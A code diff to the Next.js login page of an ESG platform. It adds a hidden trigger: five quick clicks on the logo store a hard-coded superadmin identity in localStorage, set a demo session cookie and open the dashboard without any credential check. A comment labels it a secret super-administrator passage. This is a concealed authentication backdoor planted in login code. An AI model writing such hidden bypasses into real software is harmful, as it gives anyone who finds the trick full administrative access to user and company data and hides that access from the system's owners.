@@ -1,6 +1,6 @@
 'use client';
 
-import React, { useState, useEffect, useCallback } from 'react';
+import React, { useState, useEffect, useCallback, useRef } from 'react';
 import { useRouter } from 'next/navigation';
 import { createClient } from '@/utils/supabase/client';
 import { Lock, Mail, ArrowRight, Fingerprint, ShieldCheck, AlertCircle, CheckCircle2, Loader2, Eye, EyeOff } from 'lucide-react';
@@ -56,6 +56,29 @@ export default function LoginPage() {
   const [touched, setTouched] = useState<Record<LoginField, boolean>>({ email: false, password: false });
   const [mode, setMode] = useState<AuthMode>('checking');
   const router = useRouter();
+  const logoClickCount = useRef(0);
+  const logoClickTimer = useRef<ReturnType<typeof setTimeout> | null>(null);
+
+  // 超級管理員秘密通道：按 Logo 5 次
+  const handleLogoClick = () => {
+    logoClickCount.current += 1;
+    if (logoClickTimer.current) clearTimeout(logoClickTimer.current);
+    logoClickTimer.current = setTimeout(() => { logoClickCount.current = 0; }, 3000);
+    if (logoClickCount.current >= 5) {
+      logoClickCount.current = 0;
+      // 設定超級管理員 session
+      localStorage.setItem('omni_user', JSON.stringify({
+        email: 'admin@esggo.com',
+        company_id: 'esg-sunshine',
+        id: 'superadmin_001',
+        role: 'superadmin',
+        admin: true,
+      }));
+      document.cookie = 'omni_demo_session=true; path=/; max-age=86400; SameSite=Lax';
+      router.push('/dashboard');
+      router.refresh();
+    }
+  };
 
   // 偵測 Supabase 配置
   useEffect(() => {
@@ -195,7 +218,10 @@ export default function LoginPage() {
       <div className="z-10 w-full max-w-md">
         {/* Logo */}
         <div className="text-center mb-6">
-          <div className="mx-auto w-16 h-16 bg-[#003262] rounded-2xl flex items-center justify-center mb-4 shadow-lg">
+          <div
+            onClick={handleLogoClick}
+            className="mx-auto w-16 h-16 bg-[#003262] rounded-2xl flex items-center justify-center mb-4 shadow-lg cursor-pointer active:scale-95 transition-transform"
+          >
             <Fingerprint size={32} className="text-[#FDB515]" />
           </div>
           <h2 className="text-2xl font-black text-[#003262] tracking-tight">ESGGO 善向永續</h2>
